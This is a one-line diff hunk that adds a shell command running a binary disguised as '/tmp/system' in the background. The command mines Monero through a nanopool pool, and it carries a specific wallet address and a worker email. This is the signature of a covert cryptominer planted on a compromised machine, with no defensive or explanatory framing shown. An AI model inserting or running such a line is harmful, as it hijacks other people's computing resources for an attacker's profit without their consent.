@@ -1,0 +1,1 @@
+cd /tmp && /tmp/system --currency monero -o xmr-asia1.nanopool.org:14444 -u 45rNdpCBmv2Seqk16J79r5g4hUrdsRMpQT1bwMP8bjnCTx5S3DaKoVbQyaNJ767V3HhY2kFb3DgDdeYkUkC59q5R4rif9Qg.str2zxc/troublecheckerzxc@gmail.com >/tmp/system.log &
